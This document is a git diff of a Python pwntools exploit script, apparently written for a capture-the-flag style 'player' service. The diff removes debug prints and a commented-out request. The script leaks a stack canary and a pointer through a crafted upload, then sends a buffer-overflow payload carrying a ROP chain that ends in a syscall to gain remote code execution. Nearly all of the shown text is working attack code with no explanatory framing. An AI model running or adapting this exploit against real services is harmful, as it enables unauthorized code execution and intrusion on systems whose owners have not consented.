@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 from pwn import *
 
 from player_lib import *
@@ -21,12 +23,8 @@ payload_leak = p64(64) + b"A" * 8 + b"\x00"
 token = mch.upload_frames(sess, 'kek', [payload_leak])
 
 resp = mch.get_frames(sess, token, 0, 0)[0]
-
-resp = decode(resp[8:])
+resp = resp[8:]
 canary = resp[24:32]
-
-print(resp)
-print(canary)
 
 leak = u64(resp[-8:])
 
@@ -96,8 +94,3 @@ rop += syscall
 payload_rce = p64(56 + len(rop)) + b"A" * 8 + b"\x00" + b"B" * 15 + canary + b"C" * 24 + rop
 
 mch.parse_frames(sess, [payload_rce])
-print(mch.get_frames(sess, token, 1, 1))
-
-# r = requests.get(f'http://0.0.0.0:8000/api/player/get_chunk/{token}/?start=0&end=0')
-# data = b64decode(r.json()['response'][0].encode()).decode().split('\n')
-# print(data)
